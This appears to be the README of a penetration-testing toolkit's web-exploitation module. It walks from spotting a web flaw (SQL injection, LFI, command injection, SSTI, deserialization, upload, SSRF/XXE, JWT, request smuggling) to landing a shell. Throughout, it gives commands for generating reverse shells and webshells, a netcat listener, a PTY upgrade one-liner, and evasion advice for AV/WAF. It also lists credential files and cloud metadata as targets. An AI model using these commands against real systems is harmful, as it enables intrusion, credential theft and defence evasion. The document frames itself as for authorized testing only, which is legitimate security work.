# access/web — web-application exploitation → shell

> **Which access surface?** You're in `access/web/` — a **web app** to break. Siblings: `../network/` (a **cred / network / AD / cloud** way in) · `../services/` (a **service left open**). All → a shell → then `../../winpriv/`/`../../linpriv/`. (See `../../START-HERE.md`.)

**Get a shell by exploiting an app-layer vulnerability.** Sister to `../network/` (shell via creds/spray/network
services). The generators run on YOUR box and *print* payloads/commands; the shell you land feeds `winpriv`/
`linpriv` + `report/`. **Authorized engagements only.** Everything here is AV/WAF-signatured to some degree —
obfuscate, rename params, prefer one-shot revshells (see the AV note).

## Technique picker (what does the app expose?)
```
A parameter reflected in a query?          → gen_sqli.py    (SQL injection → xp_cmdshell / OUTFILE / COPY)
A file/page/include parameter?             → gen_lfi.py     (path traversal / LFI → file read → RCE)
A param passed to a shell?                 → gen_rce.py cmdi (OS command injection)
Template output reflects math ({{7*7}})?   → gen_rce.py ssti (Jinja2/Twig/Freemarker/…)
A serialized object (cookie/param/ViewState)? → gen_rce.py deserial (ysoserial/phpggc/pickle)
A file upload?                             → gen_upload.py  (bypass filters → webshell)
Server fetches a URL you influence?        → gen_ssrf.py ssrf (metadata/internal/gopher→RCE)
XML input parsed?                          → gen_ssrf.py xxe  (file read / SSRF / OOB)
A JWT (session/bearer token)?              → gen_jwt.py       (alg:none / crack / kid / RS256→HS256)
Behind a proxy/CDN (front-end + back-end)? → gen_smuggle.py   (HTTP request smuggling / desync)
A REST/GraphQL API?                        → gen_api.py       (GraphQL introspection · IDOR/BOLA · mass assignment · proto-pollution)
```
Find these with `../network/enum_net.py --web` (whatweb/httpx/nuclei/ffuf) first.

**Reading the steps:** `<x>` = you supply · `needs:` = precondition · `-> ok:` = what confirms it worked · try the listed options top-down (first = most reliable). **Test EVERY applicable technique, not just the first shell** — each web flaw (SQLi, LFI, RCE, upload, SSRF, JWT, IDOR…) is its own finding; document them all in `report/`, even after you're in. One patched bug doesn't close the others.

## The building block — payloads
```bash
python3 gen_webshell.py rev bash        # reverse-shell one-liner (bash|sh|nc|python|php|perl|ruby|powershell|bash64)
python3 gen_webshell.py shell php        # a minimal webshell body (php|jsp|asp|aspx)
```
Every technique below ultimately runs one of these. Catch with `nc -lvnp 443`. `bash64` nests cleanly through filters.

## SQL injection → shell
```bash
python3 gen_sqli.py detect                        # is it injectable + which DBMS
python3 gen_sqli.py shell --db mssql              # xp_cmdshell (= privesc ROUTE 1 if SeImpersonate!)
python3 gen_sqli.py shell --db mysql|postgres     # INTO OUTFILE webshell / COPY FROM PROGRAM
python3 gen_sqli.py sqlmap --url '<url>'          # automate incl. --os-shell
```
MSSQL `xp_cmdshell` lands you exactly at `winpriv` Route 1. No direct exec? dump creds → `../network/gen_shell`.

## Path traversal / LFI → file read + RCE
```bash
python3 gen_lfi.py read --param page --file /etc/passwd   # traversal + wrappers + encodings/bypasses
python3 gen_lfi.py rce                                    # log poisoning · data:// · php://input · session · phpinfo
python3 gen_lfi.py rfi                                    # remote include (allow_url_include)
```
High-value reads: app config (DB creds), `/etc/shadow`, `~/.ssh/id_rsa`, `.env`, `/proc/self/environ`, IIS/Apache logs.

## Direct RCE
```bash
python3 gen_rce.py cmdi                            # separators, blind/OOB confirm, filter bypass (${IFS}, base64)
python3 gen_rce.py ssti --engine jinja2            # + twig|freemarker|velocity|erb|smarty  (detect with {{7*7}})
python3 gen_rce.py deserial --lang java            # + php|python|dotnet  (ysoserial/phpggc/pickle/ysoserial.net)
```

## File upload → webshell
```bash
python3 gen_upload.py --lang php                   # extension/content-type/magic-byte/.htaccess bypasses + where it lands
```

## SSRF / XXE
```bash
python3 gen_ssrf.py ssrf                            # cloud metadata (instant creds), internal recon, gopher→RCE, bypasses
python3 gen_ssrf.py xxe                             # file read, SSRF, OOB/blind exfil (evil.dtd)
```

## JWT / auth-token attacks
```bash
python3 gen_jwt.py none --token <jwt>        # alg:none / algorithm confusion
python3 gen_jwt.py crack --token <jwt>       # weak HMAC secret → forge admin claims (jwt_tool/hashcat -m 16500)
python3 gen_jwt.py kid --token <jwt>         # kid path-traversal / SQLi
python3 gen_jwt.py confusion --token <jwt> --pubkey key.pem   # RS256→HS256 (sign with the public key)
```

## HTTP request smuggling
```bash
python3 gen_smuggle.py detect                # CL.TE/TE.CL/TE.TE/H2 desync (Burp 'HTTP Request Smuggler' automates)
python3 gen_smuggle.py exploit --type cl.te  # front-end ACL bypass · capture others' requests · cache poison
```

## API — GraphQL · IDOR/BOLA · mass assignment · prototype pollution
```bash
python3 gen_api.py graphql                   # introspection / batching (rate-limit bypass) / injection
python3 gen_api.py idor --endpoint /api/users/1   # swap object ids (BOLA) + mass-assignment privilege fields
python3 gen_api.py protopollution            # __proto__ → RCE/DoS/bypass (Node)
```

## After you land a shell
- Upgrade to a PTY (`python3 -c 'import pty;pty.spawn("/bin/bash")'`) — see `../../linpriv/CHEATSHEET.md`.
- Enumerate for privesc: paste `../../winpriv/enum.bat` or run `../../linpriv/enum.sh`.
- Log every finding for the report (initial-access `vector_type`s: sqli, webshell, rce_web, lfi/path_traversal, ssti, command_injection, deserialization, ssrf, xxe).

## Safety / AV / WAF
- **Webshells + tool payloads are signatured** — obfuscate, rename params, prefer one-shot revshells over persistent webshells; recompile/rework ⚠ tooling. A dropped webshell is an artifact to **clean up** (record it → `report/ --cleanup`).
- **RCE/deserialization can crash the app**; **SQLi `--os-shell` and OUTFILE write to the target** — both leave artifacts. Same risk discipline as privesc.
- **Authorized scope only.** SSRF to cloud metadata / internal hosts can reach out-of-scope systems — stay in ROE.

## Execution model
Attacker: the `gen_*.py` (print) + the tools they drive (sqlmap/ffuf/tplmap/ysoserial/phpggc) + `nc -lvnp` + `http.server` (for RFI/XXE/OOB). Target: the payloads land there via the app. `../../report/preflight.sh` checks the tools.
